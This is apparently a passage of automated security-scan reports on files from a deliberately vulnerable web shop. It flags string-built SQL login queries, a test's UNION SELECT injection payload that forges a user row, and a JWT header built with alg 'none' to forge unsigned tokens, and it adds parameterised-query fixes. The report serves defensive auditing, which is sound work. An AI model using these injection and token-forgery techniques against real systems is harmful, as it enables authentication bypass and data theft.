**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginAdminChallenge_1.ts`
**Scanned at**: 2026-10-11T16:33:52.171078+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 18 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 18
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: t...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 18, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/api/login.test.ts`
**Scanned at**: 2026-10-11T16:33:53.573802+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 216 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 216
email: `' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@${config.get<string>('application.domain')}' as 'email', '12345' as 'password', 'accounting' as 'role', '' as deluxeT...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🟠 High | [SECR-M-003](https://verify.example-org.internal/?id=SECR-M-003) | Enforce Temporary Credentials and Credential Rotation in CI/CD |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [SECR-M-004](https://verify.example-org.internal/?id=SECR-M-004) | Short-Lived Credentials & Rotation |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 216, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/api/basket.test.ts`
**Scanned at**: 2026-10-11T16:33:55.809524+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [API-M-007](https://verify.example-org.internal/?id=API-M-007) | JWT 'alg:none' allows unsigned tokens — authentication bypass | 64 |

#### [API-M-007](https://verify.example-org.internal/?id=API-M-007) — JWT 'alg:none' allows unsigned tokens — authentication bypass
```ts
// Line 64
const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
```
**Suggested fix:**
```ts
// Suggested fix: always enforce a strong signing algorithm
// WRONG:  jwt.verify(token, secret, { algorithms: ['none'] })
jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });  // or RS256/ES256
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🟠 High | [IDOR-M-006](https://verify.example-org.internal/?id=IDOR-M-006) | Log Authorization Failures |
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "API-M-007", "severity": "CRITICAL", "line": 64, "message": "JWT 'alg:none' allows unsigned tokens \u2014 authentication bypass", "fix_snippet": "// Suggested fix: always enforce a strong signing algorithm\n// WRONG:  jwt.verify(token, secret, { algorithms: ['none'] })\njwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });  // or RS256/ES256"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": 